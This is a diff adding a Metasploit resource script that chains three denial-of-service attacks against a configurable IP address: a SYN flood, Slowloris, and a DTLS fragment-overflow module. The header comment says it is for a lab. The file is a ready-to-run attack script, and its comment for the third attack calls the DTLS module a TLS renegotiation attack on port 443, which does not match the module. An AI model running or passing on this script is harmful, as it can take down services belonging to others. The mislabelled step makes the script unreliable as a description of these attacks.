@@ -1,0 +1,49 @@
+# Metasploit Resource Script — DoS Demonstration
+# Usage: sudo msfconsole -r dos_attack.rc
+# Target: isolated Hyper-V VM (your own lab environment)
+#
+# Set TARGET before running, e.g.:
+#   export MSF_TARGET=192.168.1.100
+# Or edit RHOSTS lines below directly.
+
+<ruby>
+target = ENV['MSF_TARGET'] || '192.168.1.100'
+print_status("DoS demonstration target: #{target}")
+$target = target
+</ruby>
+
+# -------------------------------------------------------
+# 1. SYN Flood — exhausts TCP connection table (hits any open TCP port)
+#    Effective against SSH (22), HTTP (80), HTTPS (443)
+# -------------------------------------------------------
+use auxiliary/dos/tcp/synflood
+set RHOSTS <ruby>$target</ruby>
+set RPORT 80
+set TIMEOUT 30
+set NUM_THREADS 50
+run
+back
+
+# -------------------------------------------------------
+# 2. Slowloris HTTP DoS — holds HTTP connections open
+#    until the server runs out of worker threads
+#    Only targets port 80 (HTTP)
+# -------------------------------------------------------
+use auxiliary/dos/http/slowloris
+set RHOSTS <ruby>$target</ruby>
+set RPORT 80
+set SOCKETS 500
+set DELAY 15
+run
+back
+
+# -------------------------------------------------------
+# 3. SSL/HTTPS renegotiation DoS — forces repeated TLS
+#    handshakes, consuming server CPU
+#    Targets port 443 (HTTPS)
+# -------------------------------------------------------
+use auxiliary/dos/ssl/dtls_fragment_overflow
+set RHOSTS <ruby>$target</ruby>
+set RPORT 443
+run
+back
